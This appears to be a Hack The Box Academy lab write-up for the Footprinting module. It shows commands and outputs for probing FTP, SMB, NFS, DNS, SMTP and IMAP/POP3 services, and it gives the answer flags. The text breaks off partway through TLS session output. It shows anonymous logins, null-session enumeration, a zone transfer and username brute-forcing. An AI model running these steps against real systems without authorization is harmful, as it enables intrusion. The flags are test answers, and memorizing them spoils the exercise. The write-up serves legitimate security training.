# Web Requests
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Footprinting
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: 27-01-2023
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## FTP
### Question 1:
![](./attachments/Pasted%20image%2020230124122251.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting]
└─$ sudo nmap -n -sV -sC -p20,21 -T5 -oA nmap_sV_sC_FTP_scan 10.129.202.5 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 06:35 EST
Nmap scan report for 10.129.202.5
Host is up (0.090s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftpuser  ftpuser        39 Nov  8  2021 flag.txt
| fingerprint-strings: 
|   GenericLines: 
|     220 InFreight FTP v1.1
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 InFreight FTP v1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=1/24%Time=63CFC280%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20InFreight\x20FTP\x20v1\.1\r\n")%r(GenericLines,74,"220\x20I
SF:nFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20command:\x20try\x20being\
SF:x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20mo
SF:re\x20creative\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.33 seconds
```

**Answer:** `InFreight FTP v1.1`

## 
### Question 2:
![](./attachments/Pasted%20image%2020230124122307.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting]
└─$ ftp 10.129.202.5      
Connected to 10.129.202.5.
220 InFreight FTP v1.1
Name (10.129.202.5:kali): ftpuser        
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27437|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftpuser  ftpuser        39 Nov  8  2021 flag.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||47566|)
150 Opening BINARY mode data connection for flag.txt (39 bytes)
    39        1.16 MiB/s 
226 Transfer complete
39 bytes received in 00:00 (0.31 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/HTB/Footprinting]
└─$ cat flag.txt   
HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}
```

**Answer:** `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}`

---
##  SMB
### Question 1:
![](./attachments/Pasted%20image%2020230124200554.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ nmap -n -sV -sC -p137-139,445 -oA nmap_sV_sC_137,138,139,445_scan 10.129.189.54    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 14:03 EST
Nmap scan report for 10.129.189.54
Host is up (0.064s latency).

PORT    STATE  SERVICE     VERSION
137/tcp closed netbios-ns
138/tcp closed netbios-dgm
139/tcp open   netbios-ssn Samba smbd 4.6.2
445/tcp open   netbios-ssn Samba smbd 4.6.2

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-01-24T19:03:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

**Answer:** `Samba smbd 4.6.2`

### Question 2:
![](./attachments/Pasted%20image%2020230124200604.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ rpcclient -U "" 10.129.189.54
Password for [WORKGROUP\]:
rpcclient $> netshareenumall
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
netname: IPC$
        remark: IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
        path:   C:\tmp
        password:
```

**Answer:** `sambashare`

### Question 3:
![](./attachments/Pasted%20image%2020230124200611.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ smbclient  //10.129.189.54/sambashare
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> cd contents
smb: \contents\> ls
  .                                   D        0  Mon Nov  8 08:43:45 2021
  ..                                  D        0  Mon Nov  8 08:43:14 2021
  flag.txt                            N       38  Mon Nov  8 08:43:45 2021

                4062912 blocks of size 1024. 414196 blocks available
smb: \contents\> get flag.txt
getting file \contents\flag.txt of size 38 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \contents\> !ls
flag.txt                               nmap_sV_sC_137,138,139,445_scan.nmap
nmap_sV_sC_137,138,139,445_scan.gnmap  nmap_sV_sC_137,138,139,445_scan.xml
smb: \contents\> !cat flag.txt
HTB{o873nz4xdo873n4zo873zn4fksuhldsf}

```

**Answer:** `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`

### Question 4:
![](./attachments/Pasted%20image%2020230124200632.png)
*Hint: Remember that we can use other services to obtain information about specific shares.*

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ rpcclient -U "" 10.129.189.54
Password for [WORKGROUP\]:
rpcclient $> querydominfo
Domain:         DEVOPS
Server:         DEVSMB
Comment:        InlaneFreight SMB server (Samba, Ubuntu)
Total Users:    0
Total Groups:   0
Total Aliases:  0
Sequence No:    1674587516
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

**Answer:** `DEVOPS`

### Question 5:
![](./attachments/Pasted%20image%2020230124200706.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ rpcclient -U "" 10.129.189.54
Password for [WORKGROUP\]:
rpcclient $> netsharegetinfo sambashare
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0

rpcclient $> exit
```

**Answer:** `InFreight SMB v3.1`

### Question 6:
![](./attachments/Pasted%20image%2020230124200714.png)
*Hint: Remember that Linux-based operating systems do not have a "C:\" drive.*

```
──(kali㉿kali)-[~/HTB/Footprinting/SMB]
└─$ rpcclient -U "" 10.129.189.54
Password for [WORKGROUP\]:
rpcclient $> netsharegetinfo sambashare
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
(...)
```

In order to convert the path to Unix format, we just need to remove `C:` and flip the backwards slash to a forwards slash.

**Answer:** `/home/sambauser`

---
## NFS
### Question 1:
![](./attachments/Pasted%20image%2020230125101101.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ sudo nmap -n -sV --script nfs* -p111,2049 -oA nmap_sV_nfsScritp_111,2049_scan 10.129.27.210
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 04:25 EST
Nmap scan report for 10.129.27.210
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33651/udp   mountd
|   100005  1,2,3      39590/udp6  mountd
|   100005  1,2,3      45371/tcp6  mountd
|   100005  1,2,3      45409/tcp   mountd
|   100021  1,3,4      34754/udp   nlockmgr
|   100021  1,3,4      36013/tcp   nlockmgr
|   100021  1,3,4      40473/tcp6  nlockmgr
|   100021  1,3,4      44722/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
| nfs-showmount: 
|   /var/nfs 10.0.0.0/8
|_  /mnt/nfsshare 10.0.0.0/8
| nfs-statfs: 
|   Filesystem     1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|   /var/nfs       4062912.0  3422636.0  414180.0   90%   16.0T        32000
|_  /mnt/nfsshare  4062912.0  3422636.0  414180.0   90%   16.0T        32000
| nfs-ls: Volume /var/nfs
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxr-xr-x   65534  65534  4096  2021-11-08T15:08:27  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   65534  65534  39    2021-11-08T15:08:27  flag.txt
| 
| 
| Volume /mnt/nfsshare
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxr-xr-x   65534  65534  4096  2021-11-08T14:06:40  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   65534  65534  59    2021-11-08T14:06:40  flag.txt
|_
2049/tcp open  nfs_acl 3 (RPC #100227)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

We see two shares, `nfs` and `nfsshare`.

```
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ showmount -e 10.129.27.210
Export list for 10.129.27.210:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

Again, we confirm the two shares.

```
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ sudo mount -t nfs 10.129.27.210:/ ./nfs/ -o nolock
                                                                                                          
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ tree
.
└── nfs
    ├── mnt
    │   └── nfsshare
    │       └── flag.txt
    └── var
        └── nfs
            └── flag.txt

┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ cat nfs/var/nfs/flag.txt
HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
```

**Answer:** `HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}`

### Question 2:
![](./attachments/Pasted%20image%2020230125101110.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ tree
.
└── nfs
    ├── mnt
    │   └── nfsshare
    │       └── flag.txt
    └── var
        └── nfs
            └── flag.txt

┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ cat nfs/mnt/nfsshare/flag.txt
HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
```

To unmount the share:

```
┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ sudo umount ./nfsshare

┌──(kali㉿kali)-[~/HTB/Footprinting/NFS]
└─$ tree
.
├── nfs
└── nfsshare
```

**Answer:** `HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}`

---
## DNS
### Question 1:
![](./attachments/Pasted%20image%2020230125104111.png)

```
┌──(kali㉿kali)-[~]
└─$ dig ns inlanefreight.htb @10.129.156.126

; <<>> DiG 9.18.7-1-Debian <<>> ns inlanefreight.htb @10.129.156.126
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10258
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 8da8b1692dc0b8e50100000063d10ae1c8f2d66344dd116b (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      NS

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1

;; Query time: 63 msec
;; SERVER: 10.129.156.126#53(10.129.156.126) (UDP)
;; WHEN: Wed Jan 25 05:56:33 EST 2023
;; MSG SIZE  rcvd: 107
```

FQDN is `ns.inlanefreight.htb`.

**Answer:** `ns.inlanefreight.htb`

### Question 2:
![](./attachments/Pasted%20image%2020230125104120.png)
*Hint: Zones often have the name of a subdomain.*

```
┌──(kali㉿kali)-[~]
└─$ dig axfr internal.inlanefreight.htb @10.129.156.126

; <<>> DiG 9.18.7-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.156.126
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN   TXT     "MS=ms97310371"
internal.inlanefreight.htb. 604800 IN   TXT     "HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN   TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN   TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      127.0.0.1
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 75 msec
;; SERVER: 10.129.156.126#53(10.129.156.126) (TCP)
;; WHEN: Wed Jan 25 06:01:31 EST 2023
;; XFR size: 15 records (messages 1, bytes 677)
```

**Answer:** `HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}`

### Question 3:
![](./attachments/Pasted%20image%2020230125104128.png)

The answer is visible in the answer of the previ

```
(...)
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
(...)
```

**Answer:** `10.129.34.16`

### Question 4:
![](./attachments/Pasted%20image%2020230125104137.png)
*Hint: Remember that different wordlists do not always have the same entries.*

```
┌──(kali㉿kali)-[~]
└─$ dnsenum --dnsserver 10.129.156.126 --enum -p 0 -s 0 -o subdomains3.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
dnsenum VERSION:1.2.6

-----   dev.inlanefreight.htb   -----                                                                                                                                                                                    
                                                          
Host's addresses:                                                                                                                                                                                                        
__________________                                                                                                                                                                                                       
                                                            
Name Servers:                                                                                                                                                                                                            
______________                                                                                                                                                                                                           
                                                               
ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1                                                                                                                                              
                                                                 
Mail (MX) Servers:                                                                                                                                                                                                       
___________________                                                                                                                                                                                                      
                                                              
Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                         
_________________________________________________                                                                                                                                                                        
                                            
unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 2.                                                                                                                                           

Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers
                                                   
Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:                                                                                                                                                
__________________________________________________________________________                                                                                                                                               
                         
dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6                                                                                                                                              
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203
```

**Answer:** `win2k.dev.inlanefreight.htb`

---
## SMTP
### Question 1:
![](./attachments/Pasted%20image%2020230125125440.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SNMP]
└─$ sudo nmap -n -sV -sC -p25 -oA nmap_sV_sC_25_scan 10.129.168.225
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 12:58 EST
Nmap scan report for 10.129.168.225
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|_    Syntax: EHLO hostname
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.93%I=7%D=1/25%Time=63D16DC9%P=x86_64-pc-linux-gnu%r(Hell
SF:o,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO\x20
SF:hostname\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.38 seconds
```

**Answer:** `InFreight ESMTP v2.11`

## 
### Question 2:
![](./attachments/Pasted%20image%2020230125125449.png)
*Hint: On systems usernames are often named after the employee's name. We recommend to use the Footprinting-wordlist provided as resource. Remember that some SMTP servers have higher response times.*

```
┌──(kali㉿kali)-[~]
└─$ smtp-user-enum -w 8 -M VRFY -U /home/kali/Downloads/footprinting-wordlist.txt -t 10.129.168.225
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /home/kali/Downloads/footprinting-wordlist.txt
Target count ............. 1
Username count ........... 101
Target TCP port .......... 25
Query timeout ............ 8 secs
Target domain ............ 

######## Scan started at Wed Jan 25 14:15:14 2023 #########
10.129.168.225: robin exists
######## Scan completed at Wed Jan 25 14:17:56 2023 #########
1 results.

101 queries in 162 seconds (0.6 queries / sec)
```

**Answer:** `robin`

---
## IMAP / POP3
### Question 1:
![](./attachments/Pasted%20image%2020230125201914.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IMAP_POP3]
└─$ sudo nmap -n -sV -sC -p110,143,993,995 -oA nmap_sV_sC_110,143,993,995_scan 10.129.42.195 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 14:49 EST
Nmap scan report for 10.129.42.195
Host is up (0.056s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL TOP STLS PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: LOGINDISABLEDA0001 have capabilities more STARTTLS Pre-login IDLE listed post-login ENABLE OK ID LOGIN-REFERRALS IMAP4rev1 LITERAL+ SASL-IR
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_imap-capabilities: have capabilities more Pre-login listed IDLE AUTH=PLAINA0001 post-login ENABLE OK ID LOGIN-REFERRALS SASL-IR IMAP4rev1 LITERAL+
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: SASL(PLAIN) TOP USER PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
```

**Answer:** `InlaneFreight Ltd`

---
## 
### Question 2:
![](./attachments/Pasted%20image%2020230125201921.png)

The answer is visible in the answer of the last question.

```
commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
```

**Answer:** `dev.inlanefreight.htb`

### Question 3:
![](./attachments/Pasted%20image%2020230125202044.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IMAP_POP3]
└─$ openssl s_client -connect 10.129.42.195:imaps                                      
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
   i:C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov  8 23:10:05 2021 GMT; NotAfter: Aug 23 23:10:05 2295 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEUzCCAzugAwIBAgIUDf35PqFuv6Uv0EECM8dFmNSZoY8wDQYJKoZIhvcNAQEL
BQAwgbcxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjEaMBgGA1UECgwRSW5sYW5lRnJlaWdodCBMdGQxHDAaBgNVBAsME0Rldk9w
cyBEZXDDg2FydG1lbnQxHjAcBgNVBAMMFWRldi5pbmxhbmVmcmVpZ2h0Lmh0YjEs
MCoGCSqGSIb3DQEJARYdY3RvLmRldkBkZXYuaW5sYW5lZnJlaWdodC5odGIwIBcN
MjExMTA4MjMxMDA1WhgPMjI5NTA4MjMyMzEwMDVaMIG3MQswCQYDVQQGEwJVSzEP
MA0GA1UECAwGTG9uZG9uMQ8wDQYDVQQHDAZMb25kb24xGjAYBgNVBAoMEUlubGFu
ZUZyZWlnaHQgTHRkMRwwGgYDVQQLDBNEZXZPcHMgRGVww4NhcnRtZW50MR4wHAYD
VQQDDBVkZXYuaW5sYW5lZnJlaWdodC5odGIxLDAqBgkqhkiG9w0BCQEWHWN0by5k
ZXZAZGV2LmlubGFuZWZyZWlnaHQuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEAxvMwFE6m+iBUSujb5d6DUy1xDYR5awzQRwddyvq6iBrMxbnptSrn
+j0UOKWHCOpD5LREwP26ghUg0lVJzfo+v5pQJGnxEXKg0OFlzWEd8xgx/JWW/z1/
rDsWlNa2yYZkCy68YWJlC7UZxvcDFrI0V0pDJIkrjForw26laoYDkrh1A5F8uUXD
1TwRLLYo+NGmtNHT3BADJpv6aFUZ4CGrqBQNi7XpsTZ948WLhUwQvWmebiK06Dai
TvMNKBctjWAiNI4xvq34W9hIUaPxT1JJzuujRslep6nHGHW00QEWTWgyOMYThc3b
HtKIHMfDLTUMz7s8RhVVwlWE6+ly1DMRgQIDAQABo1MwUTAdBgNVHQ4EFgQUGDTC
9B5KCKPWT7vXbnMunL/mEE4wHwYDVR0jBBgwFoAUGDTC9B5KCKPWT7vXbnMunL/m
EE4wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEADh0v5XWCf3KO
atrWcoiIOC67Z0ZIO7yEF+fQo8z+Wx1dWzmCFVu7u4+l7slcdJICCGBbOX8eItWS
chwzgnWJToyX8PWY8lSaB8ifMDQcr457Y7O6NmvgU35sRcLnYYqXzu2oh0lxsFLR
vL1wpyDLPhhoI++j1fELhiJ3GWiUQrb0vfJPcbSkHTgzf0hm7mLJTaqt3WfS/Gr2
8Oh7vSfzvqvHLE7HHAO0G5Q81zo+wWsrQF0s40HEF/raEMfOy2Htm79YjyjAlLWf
ueS+u8rX2smOYdRIpL3UPx7+yZPGu47vYoetde1Z5cfTCgmeS05BQ2qMOp6Tw6+G
xUuqg8nK1Q==
-----END CERTIFICATE-----
subject=C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
issuer=C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1667 bytes and written 503 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: FF7AD1D4C63248D2F4A8BA20AFE7B58BCA3FA87219BE24E1E7E17CE455EBC211
    Session-ID-ctx: 
    Resumption PSK: 2CBEF58DF7615534BBC56F477216F67EBE4F43813A92AEF44F52D6F62D4A7EE8E5E314825309C2C0F92E2E8306632BCE
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 4e da 33 6e 7d 52 b2 6d-6b 33 14 23 dc cd 75 04   N.3n}R.mk3.#..u.
    0010 - 6e b8 c3 76 4d 6f 38 94-18 fc f5 c3 11 19 61 4a   n..vMo8.......aJ
    0020 - 69 cd c7 f6 bc 89 db 4d-15 d7 39 b3 3f 03 3f 99   i......M..9.?.?.
    0030 - 9f b3 fa 61 7d 7d 84 3a-4b 5a d4 78 ac 51 c2 8d   ...a}}.:KZ.x.Q..
    0040 - bf e8 31 a9 1d 7f dc 32-99 15 2d e8 35 8f ce d4   ..1....2..-.5...
    0050 - 4c c1 d4 f8 87 65 fc b3-a7 41 2d 9c e3 bb 97 3f   L....e...A-....?
    0060 - 50 48 a4 48 23 00 f0 3f-de 23 c6 67 91 4d 1f f9   PH.H#..?.#.g.M..
    0070 - 6c 59 cd 70 1f 74 31 dc-7f bd 35 1f 77 e5 cf ab   lY.p.t1...5.w...
    0080 - 54 4b 4a e0 09 71 b3 f3-c4 3a 0f c9 87 cb b7 9f   TKJ..q...:......
    0090 - 39 83 9c 0a f4 3a 16 d0-a4 6d 01 e8 04 8f 8d 1a   9....:...m......
    00a0 - 98 df 95 aa bf aa 4c 62-d2 07 4d 81 bd eb ef b1   ......Lb..M.....
    00b0 - f5 eb 5d 2e 93 23 8b ca-21 40 32 3b ec 8e 89 8d   ..]..#..!@2;....

    Start Time: 1674676477
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 62C217AD5817B53CD81256F1B18F6EA02199FDA016AE755FA8329F07C415D346
    Session-ID-ctx: 
    Resumption PSK: EE6EEA81993CC0E63F4960F7E8B0A4597EEAD14D716A43B0820D26C7E3204563B6347594E0803E10A92C46334718571A
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 4e da 33 6e 7d 52 b2 6d-6b 33 14 23 dc cd 75 04   N.3n}R.mk3.#..u.
